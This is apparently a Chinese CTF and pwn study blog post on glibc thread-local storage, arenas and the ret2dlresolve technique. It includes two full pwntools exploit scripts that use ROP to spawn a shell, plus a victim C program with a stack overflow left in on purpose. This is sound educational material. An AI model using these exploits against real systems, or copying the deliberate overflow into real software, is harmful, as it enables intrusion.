---
title: GLIBC - 基础补充 - 多线程 && TLS && ret2dlresolve
date: 2024-03-14 08:15:38
tags:
  - Glibc
---

> 经过一场面试没想到自己的基础如此 vulnerable，在此复盘一下面试并回顾一下几个用户态 PWN 常见的难点。

# 多线程与 TLS

## 问题：1）TLS 在什么位置 2）主线程与子线程的堆分配有什么不同

TLS 所在的空间由 mmap 分配，主线程的 TLS 位置通常比较随机，而子线程的 TLS 通常作为线程栈的一部分被分配，其好处是避免额外的内存分配。

其中带来的问题就是子线程中可能可以通过不太大的栈溢出就能覆写 TLS 的 `stack_guard`：

```gdb
pwndbg> i r fs_base
fs_base        0x7ffff7bff6c0      140737349940928
pwndbg> i r rsp
rsp            0x7ffff7bfeed8      0x7ffff7bfeed8
pwndbg> distance 0x7ffff7bfeed8 0x7ffff7bff6c0
0x7ffff7bfeed8->0x7ffff7bff6c0 is 0x7e8 bytes (0xfd words)
```

<!-- > 在 glibc 中，线程有自己的 arena，但是 arena 的个数是有限的，一般跟处理器核心个数有关，假如线程个数超过 arena 总个数，并且执行线程都在使用，那么该怎么办呢。Glibc 会遍历所有的 arena，首先是从主线程的 main_arena 开始，尝试 lock 该 arena，如果成功 lock，那么就把这个 arena 给线程使用。[1] -->

Arena 负责堆块内存的管理，但 Thread 与 Arena 也不是一一对应的：

- 32 位系统 arena 数量为：`2 * core + 1`
- 64 位系统 arena 数量为：`8 * core + 1`

在多线程程序中就出现了堆块重用：

1. 从 `main_arena` 开始遍历所有 arena，并尝试对其上锁

2. 若成功上锁，则返回给用户

3. 若没有可用的 arena，则阻塞这次调用

---

# ret2dlresolve

## 问题：简述 ret2dlresolve 的使用场景与限制条件

ret2dlresolve 通常用来应对栈题不给泄漏的情况，要求已经能控制程序控制流（ROP）、已知 elf 基址、没有开启 `FULL_RELRO`。

这里有几个思路类似的利用手法：

- [GLIBC - Exploitation-in-Latest-Glibc-0x01 House of Blindness](glibc-blindness)：打的是 `_dl_fini` 中的利用链，要求能够实现 elf 或 libc 范围内的任意地址写且程序正常退出，低字节覆盖 `l->l_addr` 和 `l->l_info[DT_FINI_ARRAY/DT_FINI]->d_un.d_ptr`，即可调用 elf 中的任意函数。

- [Libc-GOT-Hijacking (only works for glibc < 2.39)](https://github.com/n132/Libc-GOT-Hijacking)：将任意地址写转为 RCE，但是对于 glibc-2.39，libc 也引入了 `FULL_RELRO`，该利用方法不再适用。glibc-2.35 之后 libc GOT 表头部不再可写故引入了新的 gadget。[Issue with Libc-GOT-Hijacking Method on Newer Libc Versions (2.37, 2.38) #1](https://github.com/n132/Libc-GOT-Hijacking/issues/1)

## 原理

ret2dlresolve 的利用技巧与动态链接 elf 的 lazybinding 机制有关：

1. 首先在调用 `libc_func@plt` 的时候，动态链接的程序并不能直接跳转到 libc 里执行，而是先 jmp 到其 got 表对应的表项上继续运行，这也是 got-hijack 利用手法的由来。

```
 ► 0x555555400710 <puts@plt>                         jmp    qword ptr [rip + 0x200902]    <puts@got[plt]>

   0x555555400716 <puts@plt+6>                       push   0
   0x55555540071b <puts@plt+11>                      jmp    0x555555400700                <0x555555400700>
    ↓
   0x555555400700                                    push   qword ptr [rip + 0x200902]    <_GLOBAL_OFFSET_TABLE_+8>
   0x555555400706                                    jmp    qword ptr [rip + 0x200904]    <_dl_runtime_resolve_xsavec>
```

2. 在非 `FULL_RELRO` 的情况下，程序会先将目标 got 表项序号（如此处 puts 为 0，write 为 1）推入栈中作为第二个参数，`link_map` 推入栈中作为第一个参数调用 `_dl_runtime_resolve`。源码见 [`/sysdeps/x86_64/dl-trampoline.h`](https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/x86_64/dl-trampoline.h)。

```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 6

[0x555555601018] puts@GLIBC_2.2.5 -> 0x555555400716 (puts@plt+6) ◂— push 0 /* 'h' */
[0x555555601020] write@GLIBC_2.2.5 -> 0x555555400726 (write@plt+6) ◂— push 1
[0x555555601028] strlen@GLIBC_2.2.5 -> 0x555555400736 (strlen@plt+6) ◂— push 2
[0x555555601030] __stack_chk_fail@GLIBC_2.4 -> 0x555555400746 (__stack_chk_fail@plt+6) ◂— push 3
[0x555555601038] read@GLIBC_2.2.5 -> 0x555555400756 (read@plt+6) ◂— push 4
[0x555555601040] setvbuf@GLIBC_2.2.5 -> 0x555555400766 (setvbuf@plt+6) ◂— push 5
```

3. 最后 `_dl_runtime_resolve` 函数内部调用 `_dl_fixup` 实现动态库中函数的查找，实则又是通过字符串定位的目标函数。源码见 [`/elf/dl-runtime.c#L61`](https://elixir.bootlin.com/glibc/glibc-2.27/source/elf/dl-runtime.c#L61)。

其中有如下关键定义：

- [Dynamic section](https://elixir.bootlin.com/glibc/glibc-2.27/source/elf/elf.h#L835)

```c
/* Dynamic section entry.  */

typedef struct
{
  Elf32_Sword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf32_Word d_val;			/* Integer value */
      Elf32_Addr d_ptr;			/* Address value */
    } d_un;
} Elf32_Dyn;

typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;

/* Legal values for d_tag (dynamic entry type).  */

#define DT_NULL		0		/* Marks end of dynamic section */
#define DT_NEEDED	1		/* Name of needed library */
#define DT_PLTRELSZ	2		/* Size in bytes of PLT relocs */
#define DT_PLTGOT	3		/* Processor defined value */
#define DT_HASH		4		/* Address of symbol hash table */
#define DT_STRTAB	5		/* Address of string table */
#define DT_SYMTAB	6		/* Address of symbol table */
// ...
#define DT_REL		17		/* Address of Rel relocs */
// ...
```

- `Elf64_Sym`

```c
typedef struct {
  Elf64_Word  st_name;     /* Symbol name (string tbl index) */
  unsigned char st_info;   /* Symbol type and binding */
  unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
  Elf64_Section st_shndx;  /* Section index */
  Elf64_Addr  st_value;    /* Symbol value */
  Elf64_Xword st_size;     /* Symbol size */
} Elf64_Sym;
```

## `NO_RELRO` 直接劫持 strtab

`NO_RELRO` 的场景下可以直接写 `_DYNAMIC` 区域内存，在另一个地方伪造新的 strtab 并存入 `_DYNAMIC.DT_STRTAB`：

无需泄漏 libc 地址，最终可以把 victim 函数@plt + offset 的地址当作指定 libc 函数在 ROP 链中进行调用（这里时 puts@plt+6 被解析成 system 函数实现利用）：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

evil_buf = 0x600C28 + 8
pop_rdi_ret = 0x00000000004007F3
pop_rsi_2_ret = 0x00000000004007F1
_DYNMIC_STRTAB = 0x600A48

ru(b"Input your name: \n")
payload = flat(
    {
        0x28: [
            pop_rdi_ret,
            0,
            pop_rsi_2_ret,
            evil_buf,
            0,
            elf.plt.read,
            pop_rsi_2_ret,
            _DYNMIC_STRTAB,
            0,
            elf.plt.read,
            pop_rdi_ret + 1,
            pop_rdi_ret,
            evil_buf + 0x20,
            0x400566,
        ]
    }
)
s(payload)

input()
payload = b"\x00libc.so.6\x00system\x00".ljust(0x20, b"\x00") + b"/bin/sh\x00"
s(payload)

input()
payload = p64(evil_buf)
s(payload)

ia()
```

## `Partial_RELRO` 伪造 `link_map`

在 `Partial_RELRO` 的情况下，GOT 表以外的数据段就变成了只读（包括上面的 `_DYNAMIC`），但是 GOT 表仍然是可写的（为了支持 lazy binding 加速程序启动速度）。在这种情况下上述针对 `NO_RELRO` 修改 `DT_STRTAB` 的利用方法就失效了，但 `link_map` 还是可以伪造的。

利用的关键在 [`_dl_fixup`](https://elixir.bootlin.com/glibc/glibc-2.27/source/elf/dl-runtime.c#L61) 函数里，函数本身比较复杂。但是假如把关注点放在伪造 `link_map` 任意调用 libc 函数上，我们就只需要使 `l->l_addr` 为自定义偏移值，`sym->st_value` 为已解析函数，最后手动模拟 plt 表中调用 `_dl_runtime_resolve` 函数就能在无泄漏的情况下任意调用 libc 函数。

```c
_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
        // ...
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
	 address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
      result = l;
    }
```

继续结合调试分析 `link_map` 伪造格式：

```python
fake_link_map = flat({
    0x00: [l_addr],      # 存放自定义偏移值
    0x68: [your_strtab], # 避免段错误，l_info[DT_STRTAB]
    0x70: [fake_symtab], # 这里需要构造一个已解析的 symtab，事实上通常指向第一个 got 表项函数 - 8 的地址
    0xF8: [fake_rel],    # 这里绕过 assertion，value 需要指向 [writeable_addr - l_addr, 7]
})
```

这里值得思考的是 `fake_symtab` 的构造，其它都可以根据调试逆推得到：

1. 首先最终利用要借助 `l->l_addr + sym->st_value`，前者已经能够由伪造 `link_map` 任意控制，后者最好是一个已解析的 got 表项的值。

2. 还要绕过 `sym->st_other != 0`，调试可以得到 `( *(sym + 5) ) & 0x03 != 0` 的条件。

故 got 表项中的第一项是最合适的 `sym->st_value` 值，同时也符合条件 2。

在这里（victim 程序见附录）即为 `elf.got.puts - 8`，同时手动调用 `_dl_runtime_resolve` 前需要额外布置栈上的索引值（0）：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

pop_rdi_ret = 0x0000000000400823
pop_rsi_2_ret = 0x0000000000400821

buf_addr = 0x601088 + 8
l_addr = libc.sym.system - libc.sym.puts
r_offset = buf_addr + 0x200 - l_addr

if l_addr < 0:
    l_addr = (1 << 64) + l_addr

lg("l_addr", l_addr)
dynstr = 0x3FE2E0
fake_rel_addr = buf_addr + 0x38


ru(b"Input your name: \n")

payload = flat(
    {
        0x28: [
            pop_rsi_2_ret,
            buf_addr,
            0,
            elf.plt.read,
            pop_rdi_ret + 1,
            pop_rdi_ret,
            buf_addr + 0x50,
            0x400586,
            buf_addr,
            0,
        ]
    }
)

s(payload)

debugB()
payload = flat(
    {
        0x00: [l_addr],
        0x08: [0x05, dynstr],
        0x18: [0x06, elf.got.puts - 8],
        0x28: [0x11, fake_rel_addr],
        0x38: [r_offset, 7],
        0x50: [u64_ex(b"/bin/sh\x00")],
        0x68: [
            buf_addr + 0x08,
            buf_addr + 0x18,
        ],
        0xF8: [buf_addr + 0x28],
    },
)

s(payload)

ia()
```

## `FULL_RELRO` 不再适用

在开启 `FULL_RELRO` 的情况下 ret2dlresolve 的利用方法不再合适，若题目仍然无法产生任何泄漏，ROP 可以低位覆盖栈中残留数据来触发 syscall（比赛中成功过）。

---

# 补充

## 2024/03/13

面试时还多次问到了「你知不知道有什么保护可以阻止栈溢出」类似的问题，我只回答了一个 canary。但结束后仔细一想 fortify 其实也是，作为 GCC 提供的源码级别的保护，可以通过编译选项 `-D_FORTIFY_SOURCE={0,1,2} -O1` 选择开启级别，会将 printf、read、memcpy 等函数编译成 `__read_chk` 等函数，若 `nbytes > buflen`，则会直接 `SIGABRT` 结束程序运行。

> 作为源码级别的保护，我一直下意识地把它当做 ~~消除漏洞~~ 而非保护，就没回答上来，不知道还有没有其它的答案。此外，如果在编写题目时受到了这个东西的干扰，可以直接用 `-O0` 来禁用。

此外面试时似乎会很在意技术博客里的内容，以后还是要好好写（（

~~「所以说你现在 V8 也看得不多，kernel 也是刚起步」~~，不过我之前也一直不太确定做什么。之前看 browser pwn 感觉学习资料太少就转内核了，这次面试的时候我也把自己的方向往 kernel 上去说，但是对方好像更想要浏览器的新人（。总归固定下自己的方向比较好，精力是有限的，如果不出意外的话我会继续研究内核，感觉这里面有很多东西可以学习。

## 2024/03/18

今天突然想看一下控制流相关的保护，一查才发现 linux 竟然早在 5.13 版本就为 `x86_64` 架构提供了用户空间影子栈的支持。用户空间程序需要使用支持影子栈的 glibc 版本,并通过 prctl 系统调用显式启用影子栈。

---

# References

\[1\] [线程PWN之gkctf2020 GirlFriendSimulator](https://blog.csdn.net/seaaseesa/article/details/107581574) . _ha1vk_

\[2\] [V8 沙箱绕过](https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/) . _jayl1n_

\[3\] [ret2dl-runtime-resolve详细分析(32位&64位)](https://blog.csdn.net/seaaseesa/article/details/104478081) . _ha1vk_

\[4\] [ctf-wiki ret2dlresolve](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/) . [_ctf-wiki_](https://ctf-wiki.org/)

\[5\] [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/) . _sploitfun_

---

# 附录

## malloc 测试程序

```c
/* Per thread arena example. */
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void *threadFunc(void *arg) {
    printf("Before malloc in thread 1\n");
    getchar();
    char *addr = (char *)malloc(1000);
    printf("After malloc and before free in thread 1\n");
    printf("ADDR: %p\n", addr);
    getchar();
    free(addr);
    printf("After free in thread 1\n");
    printf("ADDR: %p\n", addr);
    getchar();
}

int main() {
    pthread_t t1;
    void *s;
    int ret;
    char *addr;

    printf("Welcome to per thread arena example::%d\n", getpid());
    printf("Before malloc in main thread\n");
    getchar();
    addr = (char *)malloc(1000);
    printf("After malloc and before free in main thread\n");
    printf("ADDR: %p\n", addr);
    getchar();
    free(addr);
    printf("After free in main thread\n");
    printf("ADDR: %p\n", addr);
    getchar();
    ret = pthread_create(&t1, NULL, threadFunc, NULL);
    if (ret) {
        printf("Thread creation error\n");
        return -1;
    }
    ret = pthread_join(t1, &s);
    if (ret) {
        printf("Thread join error\n");
        return -1;
    }
    return 0;
}
```

## ret2dlresolve victim 程序

```c
// gcc -fno-stack-protector -z norelro -no-pie ./ret2dlresolve.c -o ./ret2dlresolve
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

void vuln() {
    char buf[0x20];
    strcpy(buf, "Input your name: \n");
    write(1, buf, strlen(buf));
    read(0, buf, 0x100);
}

int main() {
    init();

    puts("ret2dlresolve");
    vuln();

    return 0;
}
```
